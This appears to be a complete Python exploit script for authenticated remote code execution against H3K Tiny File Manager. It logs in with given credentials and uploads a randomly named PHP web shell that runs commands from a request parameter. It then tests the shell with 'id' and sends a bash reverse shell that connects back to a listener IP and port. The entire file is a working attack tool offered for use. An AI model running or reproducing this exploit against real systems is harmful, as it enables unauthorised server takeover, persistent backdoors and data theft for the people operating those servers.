import argparse
import requests
import random
import string

class TinyFileManager():
    def __init__(self,target,username,password,parameter,upload_path,lhost,lport):
        self.url = target
        self.parameter = parameter
        self.upload_path = upload_path
        self.username = username
        self.password = password
        self.lhost = lhost
        self.lport = lport
        self.login()

    def upload(self,session):
        upload_url = self.url + "?" + self.parameter + "=" + self.upload_path
        payload = "<?php echo system($_REQUEST['cmd']); ?>"
        letters = string.ascii_letters
        filename = ''.join(random.choice(letters) for i in range(10)) + ".php"
        file_data = {
                self.parameter:self.upload_path,
                "fullpath":filename,
                }
        file_upload = {
                "file":(filename,payload,{"Content-Type":"application/x-php","Content-Disposition":"form-data"})
                }
        check_url = self.url.replace("tiny/tinyfilemanager.php",self.upload_path)
        session.post(upload_url,data=file_data,files=file_upload)
        
        payload_check = requests.get(check_url + "/" + filename + "?cmd=id")
        if payload_check.status_code == 200:
            print("Payload uploaded:")
            print(check_url + "/" + filename + "?cmd=id")
            print(payload_check.text)
            print("Attempting Reverse Shell")
            rev_shell = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
            rev_data = {
                    "cmd":rev_shell
            }
            requests.post(check_url + "/" + filename,data=rev_data)
        
    def login(self):
        session = requests.Session()
        login_data = {
                "fm_usr":self.username,
                "fm_pwd":self.password
                }
        login_req = session.post(self.url, data=login_data)
        if "Login failed" in login_req.text:
            print("Unable to log in, check credentials or url")
        else:
            print("We are logged in!")
            print("Attempting File Upload")
            self.upload(session)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='H3K Tiny File Manager Authenticated Remote Code Execution')
    parser.add_argument('-t', metavar='<Login URL>', help='Example: -t http://hacked.rce/tinyfilemanager.php', required=True)
    parser.add_argument('-pr', metavar='Parameter Used in URL',default="p",help="Example: -pr p - Default is p", required=False)
    parser.add_argument('-ph', metavar='Path to Upload',default="",help="Example: -ph /diretory/uploads - Default is blank", required=False)
    parser.add_argument('-u', metavar='<Username>',help="Example: -a username", required=True)
    parser.add_argument('-p', metavar='<Password>',help="Example: -p password", required=True)
    parser.add_argument('-lh', metavar='<Listener IP>',help="Example: -lh 127.0.0.1", required=True)
    parser.add_argument('-lp', metavar='<Listener Port>',help="Example: -lp 1337", required=True)
    args = parser.parse_args()
    try:
        TinyFileManager(args.t,args.u,args.p,args.pr,args.ph,args.lh,args.lp)
    except KeyboardInterrupt:
        print("Bye Bye")
        exit()